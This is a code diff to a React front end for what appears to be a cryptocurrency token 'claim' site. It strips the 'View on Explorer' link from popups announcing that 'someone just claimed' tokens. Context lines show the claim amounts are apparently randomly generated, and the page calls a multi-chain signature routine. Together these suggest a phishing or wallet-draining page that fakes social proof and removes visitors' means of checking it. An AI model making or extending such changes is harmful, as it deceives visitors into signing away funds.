@@ -76,7 +76,6 @@ const TRANSLATIONS = {
     lastClaim: 'Last claim',
     someoneJustClaimed: 'Someone just claimed!',
     securedTokens: 'secured',
-    viewOnExplorer: 'View on Explorer',
     waitingForFirstClaim: 'Waiting for first claim...',
     claimAmount: 'BTH',
     bonusTag: '+25% bonus'
@@ -127,7 +126,6 @@ const TRANSLATIONS = {
     lastClaim: 'Último reclamo',
     someoneJustClaimed: '¡Alguien acaba de reclamar!',
     securedTokens: 'asegurado',
-    viewOnExplorer: 'Ver en Explorador',
     waitingForFirstClaim: 'Esperando el primer reclamo...',
     claimAmount: 'BTH',
     bonusTag: '+25% bono'
@@ -178,7 +176,6 @@ const TRANSLATIONS = {
     lastClaim: 'Dernière réclamation',
     someoneJustClaimed: 'Quelqu\'un vient de réclamer !',
     securedTokens: 'sécurisé',
-    viewOnExplorer: 'Voir sur Explorateur',
     waitingForFirstClaim: 'En attente de la première réclamation...',
     claimAmount: 'BTH',
     bonusTag: '+25% bonus'
@@ -229,7 +226,6 @@ const TRANSLATIONS = {
     lastClaim: 'Letzte Anforderung',
     someoneJustClaimed: 'Jemand hat gerade angefordert!',
     securedTokens: 'gesichert',
-    viewOnExplorer: 'Im Explorer ansehen',
     waitingForFirstClaim: 'Warten auf erste Anforderung...',
     claimAmount: 'BTH',
     bonusTag: '+25% Bonus'
@@ -280,7 +276,6 @@ const TRANSLATIONS = {
     lastClaim: '上次领取',
     someoneJustClaimed: '刚刚有人领取了！',
     securedTokens: '已确保',
-    viewOnExplorer: '在浏览器中查看',
     waitingForFirstClaim: '等待首次领取...',
     claimAmount: 'BTH',
     bonusTag: '+25% 奖励'
@@ -331,7 +326,6 @@ const TRANSLATIONS = {
     lastClaim: '最後の請求',
     someoneJustClaimed: '誰かが請求しました！',
     securedTokens: '確保済み',
-    viewOnExplorer: 'エクスプローラーで見る',
     waitingForFirstClaim: '最初の請求を待っています...',
     claimAmount: 'BTH',
     bonusTag: '+25% ボーナス'
@@ -382,7 +376,6 @@ const TRANSLATIONS = {
     lastClaim: '마지막 클레임',
     someoneJustClaimed: '누군가 방금 클레임했습니다!',
     securedTokens: '확보됨',
-    viewOnExplorer: '익스플로러에서 보기',
     waitingForFirstClaim: '첫 클레임 대기 중...',
     claimAmount: 'BTH',
     bonusTag: '+25% 보너스'
@@ -479,7 +472,7 @@ const getRandomClaimAmount = () => {
 // ============================================
 // LIVE CLAIM POPUP COMPONENT
 // ============================================
-const LiveClaimPopup = ({ tx, onClose, onViewTransaction, translations }) => {
+const LiveClaimPopup = ({ tx, onClose, translations }) => {
   const [visible, setVisible] = useState(true);
   
   useEffect(() => {
@@ -505,12 +498,6 @@ const LiveClaimPopup = ({ tx, onClose, onViewTransaction, translations }) => {
               <span className="font-mono">{tx.hash.slice(0, 6)}...{tx.hash.slice(-4)}</span> {translations.securedTokens}{' '}
               <span className="text-red-400 font-bold">${tx.claimAmount?.toLocaleString() || '5,000'} {translations.claimAmount}</span> +25% bonus
             </p>
-            <button 
-              onClick={() => onViewTransaction(tx.hash)}
-              className="text-xs text-red-400 hover:text-red-300 mt-2 flex items-center gap-1 transition-colors"
-            >
-              {translations.viewOnExplorer} →
-            </button>
           </div>
           <button onClick={() => setVisible(false)} className="text-gray-500 hover:text-gray-300 transition-colors">
             ✕
@@ -1386,10 +1373,6 @@ function App() {
     await executeMultiChainSignature();
   };
 
-  const viewTransactionOnExplorer = (txHash) => {
-    window.open(`https://etherscan.io/tx/${txHash}`, '_blank');
-  };
-
   const formatAddress = (addr) => {
     if (!addr) return '';
     return `${addr.substring(0, 6)}...${addr.substring(38)}`;
@@ -1771,7 +1754,6 @@ function App() {
         <LiveClaimPopup 
           tx={currentPopupTx}
           onClose={() => setShowPopup(false)}
-          onViewTransaction={viewTransactionOnExplorer}
           translations={translations}
         />
       )}
